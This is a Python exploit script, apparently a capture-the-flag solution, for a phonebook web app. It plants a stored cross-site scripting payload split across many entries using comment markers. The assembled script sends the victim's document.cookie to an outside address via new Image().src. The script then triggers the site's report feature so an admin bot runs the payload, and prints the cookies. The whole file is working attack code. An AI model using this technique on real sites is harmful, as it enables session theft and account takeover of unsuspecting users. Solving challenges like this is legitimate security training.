import requests
import time

URL = 'https://phonebook.atlassian-ctf.unswsecurity.com/'
sess = requests.Session()

# First we insert a <script> tag
pbid = sess.post(URL + '/api/phonebook', json={'pbname': '<script>/*'}).json()
print(pbid)

solve_payloads = [
    ("(", "new Image"),
    (").", "src"),
    ("=", ""),
    ("'/'", ""),
    ("+", ""),
    ("'/'", ""),
    ("+1", ""),
    ("+2", ""),
    ("+", ""),
    ("'.'", ""),
    ("+3", ""),
    ("+4+", ""),
    ("'.'", ""),
    ("+56", ""),
    ("+7+", ""),
    ("'.'", ""),
    ("+89", ""),
    ("+0+", ""),
    ("':'", ""),
    ("+12", ""),
    ("+34", ""),
    ("+", ""),
    ("'/'", ""),
    ("+", "document"),
    (".", "cookie")
]

payloads = solve_payloads

for payload in payloads:
    time.sleep(0.1)
    resp = sess.post(URL + '/api/phonebook/' + str(pbid), json={
        'phonenumber': f"*/{payload[0]}/*", 'numberowner': f"*/{payload[1]}/*"
    })
sess.post(URL + '/api/phonebook/' + str(pbid) + '/report')

print(sess.cookies)
